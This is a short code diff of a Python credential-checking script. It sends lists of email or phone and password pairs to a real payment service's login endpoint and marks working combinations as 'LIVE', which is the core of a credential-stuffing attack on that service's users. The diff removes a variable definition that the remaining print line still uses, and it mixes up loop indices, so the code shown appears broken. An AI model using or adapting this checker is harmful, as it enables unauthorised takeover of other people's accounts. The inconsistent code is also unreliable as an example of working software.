@@ -5,7 +5,6 @@
 import requests
 import re
 import sys
-#from multiprocessing.pool import ThreadPool
 nc='\033[0m' #No color
 h='\033[1;32m'
 m='\033[1;31m'
@@ -33,7 +32,6 @@ headers = {
 data = '{"email_or_phone_number":"%s","password":"%s"}' % (pu[til-1],to[til-1])
 responsen = requests.post('https://gaia.sepulsa.com/bumi/account/login', headers=headers, data=data).text
 rz = re.findall(r'rescode":"[^"]*', responsen)[0]
-s=len(pu)
 print("[ \033[1;32mLIVE-%s\033[0m ] %s -> %s"%(len(s),pu,to[pil-1]))
 if "0" in rz:
     p.append(pu[til-1])
